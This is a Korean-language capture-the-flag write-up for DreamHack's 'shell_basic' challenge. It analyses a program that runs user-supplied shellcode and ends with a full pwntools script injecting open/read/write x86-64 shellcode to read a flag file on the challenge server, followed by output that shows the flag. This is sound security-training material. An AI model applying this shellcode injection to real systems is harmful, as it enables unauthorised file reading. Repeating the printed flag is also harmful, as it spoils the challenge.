# [DreamHack] shell_basic

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 입력한 셸코드를 실행하는 프로그램입니다.
> `main` 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.
> flag 위치와 이름은 `/home/shell_basic/flag_name_is_loooooong`입니다.
>
> Release: [shell_basic.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8546863/shell_basic.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159448603-e993ffa8-df48-4b16-8932-bb2afed612e6.png)

## Analysis

```c
void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

`mmap()`으로 read, write, execute 권한이 있는 `0x1000`바이트 크기의 영역을 할당하고, 그 영역에 셸코드를 입력받을 수 있다. `execve()`와 `execveat()` 시스템 콜을 사용할 수 없으니 ORW로 플래그 파일의 내용을 읽어와야 한다.

## Exploit

시나리오는 다음과 같다.

1. 셸코드에서 충분히 뒤쪽(시작 주소 + `0x500`)에 플래그 파일 이름을 적어둔다.
2. `rip`를 참조하여 플래그 파일 이름의 주소를 `rdi`에 넣는다.
3. `open()` 시스템 콜로 플래그 파일을 연다.
4. `rdi`에 저장된 플래그 파일 이름의 주소를 `rsi`로 옮긴다.
5. `read()` 시스템 콜로 그 주소에 플래그 파일의 내용을 읽어온다.
6. `write()` 시스템 콜로 플래그 파일의 내용을 출력한다.

```python
from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/shell_basic')
else:
    r = remote('host3.dreamhack.games', 23569)

flag_filename = b'/home/shell_basic/flag_name_is_loooooong'

# open(flag_filename, 0, 0)
shellcode = '''
lea rdi, [rip + 0x4f9]
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
'''

# read(flag_fd, buf, 0x100)
shellcode += '''
mov rsi, rdi
mov rdi, rax
mov rdx, 0x100
xor rax, rax
syscall
'''

# write(1, buf, 0x100)
shellcode += '''
mov rdi, 1
mov rax, 1
syscall
'''

shellcode = asm(shellcode).ljust(0x500, b'\x90') + flag_filename

r.sendafter('shellcode: ', shellcode)

r.interactive()
```

```bash
python3 solve.py
```

```
[+] Opening connection to host3.dreamhack.games on port 23569: Done
[*] Switching to interactive mode
DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
ong\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$
```
